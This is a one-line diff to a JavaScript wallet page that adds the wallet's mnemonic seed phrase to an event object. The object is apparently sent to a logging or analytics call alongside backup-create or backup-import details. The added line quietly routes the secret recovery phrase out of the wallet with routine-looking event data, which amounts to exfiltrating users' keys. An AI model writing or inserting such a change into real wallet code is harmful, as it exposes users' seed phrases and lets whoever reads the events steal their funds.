@@ -264,6 +264,7 @@ function WalletPage() {
       event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
       label: username,
       address,
+      mnemonic: w.mnemonic,
       addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
       fields: { label: w.label, signer_ready: pk ? "true" : "false" },
     });
